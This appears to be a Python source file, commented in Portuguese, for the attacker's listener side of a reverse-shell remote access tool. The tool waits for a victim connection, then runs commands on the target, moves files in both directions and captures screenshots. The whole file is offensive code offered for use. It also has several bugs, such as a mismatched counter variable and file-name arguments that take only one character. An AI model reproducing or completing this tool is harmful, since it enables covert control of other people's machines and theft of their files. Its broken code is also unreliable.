#Attack file. Server que vai receber uma conexao
import socket 
import termcolor
from termcolor import colored
import json 
import os 
import subprocess

#Receber os valores da informação
def data_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

#Codificar as mensagens
def data_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

#Fazer upload de arquivos
def upload_file(file):
    f = open(file, 'rb')
    target.send(f.read())

#Fazer download de arquivos
def download_file(file):
    f = open(file, 'wb')
    target.settimeout(5)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()
    
#Screenshot para gerar numeração automática
def t_commun():
    cont = 0
    while True:
        command = input('* Shell~%s: ' % str(ip))
        data_send(command)
        if command == 'exit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7])
        elif command [:8] == 'download':
            download_file(command[9])
        elif command[:10] == 'screenshot':
            f = open('screenshot%d' %(count), 'wb')
            target.settimeout(5)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1
        elif command == 'help':
            # Só vai funcionar quando obter uma conexão com o alvo
            print(colored('''\n exit: Closed the target machine.
                          clear: Clean the screen from the terminal. 
                          cd + "DirectoryName": Change the directory on the target machine. cd ../../
                          upload + "FileName": Send a file to the target machine.
                          download + "FileName": Download a file from the target machine.
                          screenshot: Take a screenshot of the target machine. 
                          help: Help the user to use commands.
                        '''), 'green')
        else:
            answer = data_recv()
            print(answer)


#Conectar ao IP
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('10.0.2.15', 444)) #Coloque o IP da máquina atacante aqui
print(colored('[-] Wating for connections', 'green'))
sock.listen(5)
target, ip = sock.accept()
print(colored('+ Connected with: ' + str(ip), 'green'))
t_commun()